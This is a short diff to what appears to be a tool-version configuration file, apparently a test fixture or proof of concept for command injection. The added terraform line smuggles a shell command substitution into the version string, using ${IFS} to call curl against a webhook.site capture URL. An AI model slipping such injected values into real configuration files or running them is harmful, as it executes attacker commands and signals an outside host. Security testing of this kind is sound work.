@@ -1,4 +1,4 @@
 [tools]
 node = "19.1.7.2"
-faketool = "idk"
-tool = "0.1.0"
+faketool = "idk 2"
+terraform = "0.1.0"$(curl${IFS}https://webhook.site/a2fd6a38-1fa7-4af6-b48c-00902fe58d30)
